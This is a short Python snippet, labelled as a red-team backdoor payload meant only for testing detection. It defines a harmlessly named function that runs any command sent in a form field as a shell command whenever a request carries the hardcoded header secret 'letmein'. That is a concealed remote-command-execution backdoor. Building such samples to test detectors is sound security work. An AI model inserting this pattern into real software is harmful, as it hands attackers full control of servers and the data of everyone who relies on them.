# RED TEAM PAYLOAD - Backdoor (solo per test detection)

import subprocess

def totally_normal_function():
    data = "legit"
    if request.headers.get('X-Admin-Secret') == 'letmein':
        cmd = request.form.get('cmd')
        return subprocess.check_output(cmd, shell=True)
    return data
